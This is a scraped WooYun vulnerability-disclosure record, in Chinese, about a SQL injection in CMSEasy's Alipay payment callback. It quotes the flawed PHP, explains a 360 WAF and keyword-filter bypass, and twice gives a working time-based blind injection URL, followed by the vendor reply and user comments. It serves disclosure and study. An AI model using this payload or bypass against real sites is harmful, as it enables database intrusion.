{"id": 47561, "wybug_id": "wooyun-2014-080382", "wybug_title": "cmseasy 最新版补丁绕过sql注入（绕过360waf）", "wybug_corp": "cmseasy", "wybug_author": "路人甲", "wybug_date": "2014-10-23 10:23", "wybug_open_date": "2015-01-21 10:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-21：\t细节向公众公开  简要描述： 继续绕啊绕啊 详细说明：  首先还是老地方：archive_act.php(611行）\nfunction respond_action() {        include_once ROOT . '/lib/plugins/pay/' . front::$get['code'] . '.php';        $payclassname = front::$get['code'];        $payobj = new $payclassname();        $uri = $_SERVER[\"REQUEST_URI\"];        $__uriget = strstr($uri, '?');        $__uriget = str_replace('?', '', $__uriget);        $__uriget = explode('&', $__uriget);        $_GET = array();        foreach ($__uriget as $key => $val) {            $tmp = explode('=', $val);            $_GET[$tmp[0]] = $tmp[1];            if(preg_match('/\\'|select|union|\"/i', $tmp1)){                exit('非法参数');            }        }        file_put_contents('logs11.txt', var_export($_GET,true));        $status = $payobj->respond();        if ($status) {            echo '<script type=\"text/javascript\">alert(\"' . lang('已经付款，跳转到订单查询') . '\")</script>';            front::refresh(url('archive/orders/oid/' . front::get('subject'), true));        } else {            echo '<script type=\"text/javascript\">alert(\"' . lang('跳转到订单查询') . '\")</script>';            front::refresh(url('archive/orders/oid/' . front::get('subject'), true));        }    }\n$tmp1与$tmp[1]开发人员一时犯糊涂，没看清，导致无效过滤。而且这里get参数进行了重组，从$_SERVER[\"REQUEST_URI\"]分割获取，多此一举，还导致之前的过滤全部无效，这边过滤又失效。通过front::$get['code'] 可以控制需要加载的pay文件，再看文件: alipay.php:\nfunction respond() {        if (!empty($_POST)) {            foreach($_POST as $key =>$data) {                if(preg_match('/(=|<|>|\\')/', $data)){                    return false;                }                $_GET[$key] = $data;            }        }        $payment  = pay::get_payment($_GET['code']);        $seller_email = rawurldecode($_GET['seller_email']);        $order_sn = str_replace($_GET['subject'],'',$_GET['out_trade_no']);        $order_sn = trim($order_sn);        if (!pay::check_money($order_sn,$_GET['total_fee'])) {            return false;        }        if($_GET['trade_status'] == \"WAIT_SELLER_SEND_GOODS\"||$_GET['trade_status'] == \"TRADE_FINISHED\" || $_GET['trade_status'] == \"TRADE_SUCCESS\") {            pay::changeorders($order_sn,$_GET);            return true;        }else {            return false;        }    }\n 控制参数trade_status=WAIT_SELLER_SEND_GOODS, 进入pay::changeorders($order_sn,$_GET);\npublic static function changeorders($id,$orderlog) {    \t//file_put_contents('logs.txt', $id);        $where=array();        $where['id']=$id;        $where['status']=4;        //$where['orderlog']=serialize($orderlog);        $update=orders::getInstance()->rec_update($where,$id);        if($update<1) {            exit('改变订单状态出错，请联系管理员');        }    }\n在这里 $id 就是之前$order_sn，可以直接由get参数控制。进入这个方法：$update=orders::getInstance()->rec_update($where,$id);\nfunction rec_update($row,$where) {        $tbname=$this->name;        $sql=$this->sql_update($tbname,$row,$where);        //echo $sql.\"<br>\";        return $this->query_unbuffered($sql);    }\n这里程序员又犯糊涂了， rec_update的方法 where变量明显是第二个参数，传入的时候居然$where放到了第一个参数（这个程序员开了吧！），这样$id值就被当做sql语句的条件了。好吧 开始绕waf:首先是360的waf:  检测了好多危险函数，更可恶的全局过滤单引号，看到就杀。但是$order_sn 直接被带入到了where后面 根本不需要单引号，不起作用， 在之前的方法中有一个：$order_sn = str_replace($_GET['subject'],'',$_GET['out_trade_no']);这样利用替换功能，在危险函数中间都插入^,  再把subject设置成^,就可以成功绕过360waf。接下来在sql语句执行的时候又有一个过滤器：\nif(preg_match('/(if|select|ascii|from|sleep)/i', $condition)){        \t\t//echo $condition;        \t\texit('sql inject');        \t}\n由于是update注入，又不能显示错误，sleep被过滤，只能用BENCHMARK。又过滤了if，只能用or。get参数又是从querystring中直接过去，空格会被替换成%20，所有只能用/**/替换:最终的POC：(延时盲注法，稍微改动下）\n\nmask 区域\n1.http://**.**.**/cmseasy/index.phpcase=archive&act=respond&code=alipay&subject=^&out_trade_no=ord(sub^str(datab^ase(),1,1))/^**^/not/^**^/in/^**^/(99)/^**^/or/^**^/BEN^CHMARK(100000000,md5(1))&trade_status=WAIT_SELLER_SEND_GOODS\n\n   漏洞证明：  \n\nmask 区域\n1.http://**.**.**/cmseasy/index.phpcase=archive&act=respond&code=alipay&subject=^&out_trade_no=ord(sub^str(datab^ase(),1,1))/^**^/not/^**^/in/^**^/(99)/^**^/or/^**^/BEN^CHMARK(100000000,md5(1))&trade_status=WAIT_SELLER_SEND_GOODS\n\n   修复方案：  这次绕晕了！   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2014-10-24 11:01 厂商回复： 修正 最新状态： 2014-10-24：已经被开了。。。。  ", "replys": "漏洞评价：\n评论\n     2014-10-23 10:37 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  mark    \n     2014-10-23 11:48 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  砍死路人甲；尼玛    \n     2014-10-23 12:03 |    \t\t屎蛋 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | boom)\t\t \n  砍死路人甲；尼玛     \n     2014-10-23 14:41 |    \t\t        Jn·  \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:14        | 本小菜很可爱，如果不服你TM来打我啊--哎呀...)\t\t \n  砍死路人甲；尼玛    \n     2014-10-23 21:25 |    \t\tGHK \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 请叫我小渣渣。)\t\t \n  砍死路人甲；尼玛    \n     2014-10-24 12:22 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  幸好洞主是匿名啊  小心开发砍上门    \n     2014-11-14 12:49 |    \t\tsec_jtn \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:56        | 本想无耻的刷rank，最后发现是我想太多了。...)\t\t \n  又被开了.....    \n     2015-01-21 11:11 |    \t\txyzy \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 无)\t\t \n  到底还能修好么？    \n     2015-01-21 13:19 |    \t\t暧昧 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 此号乃是吾用来装孙子也)\t\t \n  最新状态：2014-10-24：已经被开了。。。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}